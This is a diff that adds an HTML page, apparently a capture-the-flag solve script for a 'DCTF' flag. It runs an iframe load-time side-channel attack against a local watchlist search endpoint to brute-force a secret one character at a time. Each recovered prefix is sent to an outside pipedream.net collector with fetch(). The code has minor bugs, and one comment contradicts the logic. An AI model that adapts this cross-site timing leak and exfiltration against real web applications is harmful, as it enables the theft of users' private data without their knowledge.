@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IFrame Load Time Brute Force</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        iframe {
+            width: 100%;
+            height: 500px;
+            border: 1px solid #ccc;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>IFrame Load Time Brute Force</h1>
+    <p>Current Guess: <span id="currentGuess"></span></p>
+    <p>Median loading time for current guess: <span id="loadTime">0</span> ms</p>
+
+    <iframe id="myIframe"></iframe>
+
+    <script>
+        const charset = 'abcdefghijklmnopqrstuvwxyz0123456789_-}';
+        let query = ''; // Start with an empty query
+        const loadTimeDisplay = document.getElementById('loadTime');
+        const currentGuessDisplay = document.getElementById('currentGuess');
+        const iframe = document.getElementById('myIframe');
+        let startTime;
+
+        // Function to test a specific query and return the load time
+        function testQuery(char) {
+            return new Promise((resolve) => {
+                // Start timing when the iframe starts loading
+                iframe.src = `https://127.0.0.1:5000/watchlist?q=DCTF{${query + char}`;
+                startTime = performance.now();
+
+                iframe.onload = () => {
+                    const endTime = performance.now();
+                    const loadTime = endTime - startTime;
+                    resolve(loadTime);
+                };
+            });
+        }
+
+        // Function to calculate the median of an array
+        function median(values) {
+            values.sort((a, b) => a - b);
+            const middle = Math.floor(values.length / 2);
+
+            if (values.length % 2 === 0) {
+                return (values[middle - 1] + values[middle]) / 2;
+            } else {
+                return values[middle];
+            }
+        }
+
+        // Function to brute force the next character in the query
+        async function bruteForce() {
+            let bestChar = '';
+            let highestMedian = 0;
+            const timings = {};
+
+
+            for (let i=0; i<5; i++) {
+                for (let char of charset) {
+                    if (char === '_') {
+                        char = "\\_";
+                    }
+                    currentGuessDisplay.textContent = query + char;
+
+                    if(timings[char] === undefined) {
+                        timings[char] = [];
+                    }
+                    const loadTime = await testQuery(char);
+                    timings[char].push(loadTime);
+                }
+            }
+
+            for (let char of charset) {
+                if (char === '_') {
+                    char = "\\_";
+                }
+                const charMedian = median(timings[char]);
+
+                if (char === 'f') {
+                    console.log(timings[char]);
+                    console.log(char);
+                }
+
+                // Choose the character with the lowest median load time
+                if (charMedian > highestMedian) {
+                    console.log(timings[char]);
+                    console.log(char);
+                    highestMedian = charMedian;
+                    bestChar = char;
+                }
+            }
+            
+
+            if (bestChar === '}') {
+                    query += char;
+                    currentGuessDisplay.textContent = `Finished: ${query}`;
+                    return; // End brute force
+                }
+
+            // Append the best character found to the query
+            query += bestChar;
+
+            fetch("https://enznlegt62p9m.x.pipedream.net/result?q="+query);
+
+            // Start brute-forcing the next character
+            bruteForce();
+        }
+
+        // Start the brute force process
+        bruteForce();
+
+    </script>
+
+</body>
+</html>
